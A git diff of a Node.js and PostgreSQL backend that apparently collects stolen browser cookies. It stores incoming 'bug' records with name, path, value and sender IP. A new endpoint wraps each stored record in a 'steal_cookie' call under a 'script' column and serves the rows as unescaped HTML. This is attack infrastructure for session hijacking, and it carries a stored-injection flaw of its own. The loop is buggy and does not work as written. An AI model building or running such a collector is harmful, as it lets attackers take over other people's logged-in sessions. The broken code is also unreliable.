@@ -1,4 +1,5 @@
 const { Pool } = require('pg');
+const jsonToTable = require('json-to-table');
 
 const credentials = {
     user: 'me',
@@ -48,6 +49,8 @@ const clearDatabase = (request, response) => {
 const createBug = (request, response) => {
     // response.status(201).send(`Bug added: ${request.query.bug}`)
     const bug = JSON.parse(request.query.bug);
+
+    // response.status(201).send(bug)
 
     const user_ip = request.ip || request.connection.remoteAddress;
 
@@ -114,6 +117,48 @@ const getAllBugs = (request, response) => {
     })
 }
 
+const getAllBugsTable = (request, response) => {
+    pool.query('SELECT * FROM bugs', (error, results) => {
+        if (error) {
+            // throw error
+            response.status(400).send(error)
+            return;
+        }
+
+        tabled = jsonToTable(results.rows)
+
+        nameidx  = tabled[0].indexOf("bug_name")
+        pathidx  = tabled[0].indexOf("bug_path")
+        valueidx = tabled[0].indexOf("bug_value")
+
+        for (tab of tabled) {
+
+          tab.push("<a>"+steal_cookie(
+            tab[nameidx],
+            tab[pathidx],
+            tab[valueidx]
+          ) + "</a>")
+
+          tab = "<th>" + tab.join("</th></th>") + "</th>"
+
+        }
+
+        tabled[0][tabled[0].length - 1] = "script"
+
+        // htmltable = "<table><tr>" +
+          // tabled.join('</tr><tr>') +
+        htmltable = tabled.join('<br/><br/>')
+          // "</tr></table>"
+
+        console.log(htmltable)
+
+        response.status(200).send(
+          htmltable
+        )
+
+    })
+}
 
 
-module.exports = { createBug, getAllBugs, clearDatabase, createDatabase };
+
+module.exports = { createBug, getAllBugs, getAllBugsTable, clearDatabase, createDatabase };
